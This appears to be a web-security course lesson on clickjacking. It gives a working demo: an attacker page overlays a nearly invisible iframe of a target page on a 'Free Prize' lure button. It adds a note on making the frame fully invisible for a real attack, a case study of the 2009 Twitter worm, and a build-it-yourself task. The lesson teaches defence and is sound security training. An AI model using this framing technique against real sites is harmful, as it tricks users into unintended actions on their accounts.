💡 AE01-1.2: Anatomy of an Attack: A Clickjacking Demo

**Outline:**

- **The Threat (SEEI):** Seeing the attack in action. We will build a simple but effective clickjacking page to demonstrate how a vulnerable site can be manipulated.
- **The Defense (PPP):** The defense is observing the attack's success, which reinforces the absolute necessity of the server-side headers we will implement later.
- **Your Mission (Production):** Time to build your own clickjacking page to frame a vulnerable website.

### 📘 Full Lesson Content

### **Part 1: Presentation - The Threat (SEEI)**

- **What is it? (The Vulnerability):** **Frameable UI.** Any website that can be loaded inside an `iframe` and does not provide specific instructions to the browser to prevent it is vulnerable. The vulnerability is the lack of a protective policy. In this lesson, we will act as the attacker and exploit this missing policy.
    
- **How it Works (The Attack Code):** Let's build the two pages for our demo. First, the "vulnerable" page. It's a simple page with a dangerous button.
    
    **`vulnerable-page.html`**
    
    ```html
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <title>Vulnerable Page</title>
      <style>
        body { font-family: sans-serif; display: grid; place-content: center; height: 100vh; }
        button { background-color: #ff4d4d; color: white; padding: 20px; font-size: 1.5rem; border: none; border-radius: 8px; }
      </style>
    </head>
    <body>
      <button onclick="alert('Account Deleted! This was a dangerous action.')">Delete My Account</button>
    </body>
    </html>
    
    ```
    
    Now, the attacker's page. It will load the vulnerable page in a transparent `iframe`.
    
    **`attacker-page.html`**
    
    ```html
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <title>Attacker's Page</title>
      <style>
        body { font-family: sans-serif; background-color: #f0f8ff; }
        .wrapper { position: relative; width: 350px; height: 100px; margin: 50px; }
        .lure-button {
          position: absolute; top: 0; left: 0;
          width: 100%; height: 100%;
          font-size: 2rem; background-color: #4CAF50; color: white;
          border: none; border-radius: 8px; z-index: 1;
        }
        iframe {
          position: absolute; top: 0; left: 0;
          width: 100%; height: 100%;
          opacity: 0.01; /* Set to 0 for a real attack, 0.01 for demo */
          z-index: 2; /* Iframe is ON TOP of the button */
        }
      </style>
    </head>
    <body>
      <h1>Win a FREE PRIZE!</h1>
      <p>Just click the button below to claim it!</p>
      <div class="wrapper">
        <button class="lure-button">Click for Prize!</button>
        <!-- The vulnerable page is loaded here -->
        <iframe src="vulnerable-page.html"></iframe>
      </div>
    </body>
    </html>
    
    ```
    
    When you open `attacker-page.html`, you'll see the green "prize" button. But when you click it, the `alert` from the "Delete My Account" button on the invisible page will fire. The attack was successful.
    

### **Part 2: Practice - The Defense (PPP)**

- **The Golden Rule:** **If you don't test your defenses, assume they don't exist.** The purpose of building an attack demo is to develop an "attacker's mindset." By understanding how simple it is to exploit a missing header, you'll be more motivated to ensure your own applications are correctly configured.
- **Analyzing the Attack:**
    - **CSS is the Weapon:** The entire attack is orchestrated with CSS. `position: absolute` is used to stack elements, `z-index` controls which element is on top, and `opacity: 0` makes the top element invisible.
    - **No JavaScript Needed (for the attacker):** The attacker's page itself doesn't need any complex JavaScript. The victim's browser and the vulnerable page do all the work.
    - **The Only Fix is on the Victim's Server:** There is nothing the attacker can do to prevent this _if the victim's server allows framing_. The power lies entirely with the site being framed.

### 🧠 Real-World Case Study: "The Twitter 'Don't Click' Worm"

- **The Goal:** A 2009 Twitter worm used a clickjacking attack to spread.
- **The Attack:** Users would see a tweet that said "Don't click: [link]". Curiosity led many to click the link. The link went to a page that looked like a simple website.
- **The Mechanism:**
    - **Vulnerable UI:** The page contained an invisible `iframe` loading `twitter.com`.
    - **The "Click":** As the user moved their mouse across the page, the invisible `iframe` would follow the cursor.
    - **The Action:** The `iframe` was positioned so that the "Tweet" button from the Twitter UI was always directly under the user's mouse. When the user clicked anywhere on the page, they were actually clicking the "Tweet" button, which automatically posted the same "Don't click" message from their own account, causing the worm to spread virally.
- **The Fix:** Twitter implemented the `X-Frame-Options` header to prevent their site from being loaded in `iframes` on other domains, shutting down this attack vector.

### 🤔 Reflective Questions

1. In our demo, we set `opacity` to `0.01` to make the `iframe` slightly visible. For a real attack, you'd set it to `0`. Why is this small detail important for the attacker's success?
2. Some sites try to prevent framing with JavaScript "frame-buster" scripts. Why is this approach generally less reliable than using HTTP headers?
3. How could an attacker use a clickjacking attack on a web-based email client to cause damage?

### 📚 Further Reading

- **OWASP:** [Testing for Clickjacking (Manually)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking)
- **YouTube:** [Clickjacking Attack Explained and Demonstrated](https://www.google.com/search?q=https://www.youtube.com/watch%3Fv%3D7-m_0R_vIjo)
- **Wikipedia:** [History of the Twitter worm](https://www.google.com/search?q=https://en.wikipedia.org/wiki/Twitter_bot%23History)

### 📝 Mini-Task (Production)

Your mission is to become the attacker.

1. Create two local HTML files: `vulnerable.html` and `attacker.html`.
2. In `vulnerable.html`, put a single, large, brightly colored button that says "Do Not Click Me!".
3. In `attacker.html`, write the necessary HTML and CSS to create a clickjacking attack that targets your `vulnerable.html` page.
4. The visible page should have a button that says "Click Here!".
5. When you open `attacker.html` and click the "Click Here!" button, the user should be tricked into clicking the "Do Not Click Me!" button from the other page. (You can add an `onclick` alert to the vulnerable button to confirm it worked).